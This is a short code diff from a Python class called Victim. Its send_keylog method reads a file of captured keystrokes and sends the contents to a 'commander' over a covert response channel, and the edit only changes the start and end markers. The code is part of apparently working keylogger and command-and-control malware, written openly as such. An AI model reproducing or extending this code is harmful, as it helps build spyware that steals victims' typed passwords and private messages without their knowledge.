@@ -278,16 +278,17 @@ class Victim:
     def send_keylog(self):
         """Send the keylog file contents to commander."""
         log_path = "./data/captured_keys.txt"
-        
+
         if os.path.exists(log_path):
             try:
                 with open(log_path, "r") as f:
                     content = f.read()
                 
                 if content:
-                    self.send_covert_response("=== KEYLOG START ===\n")
+                    # Send with minimal markers for easier parsing
+                    self.send_covert_response(f"--- KEYLOG BEGIN ---\n")
                     self.send_covert_response(content)
-                    self.send_covert_response("=== KEYLOG END ===\n")
+                    self.send_covert_response(f"--- KEYLOG END ---\n")
                 else:
                     self.send_covert_response("Keylog file is empty.\n")
             except Exception as e:
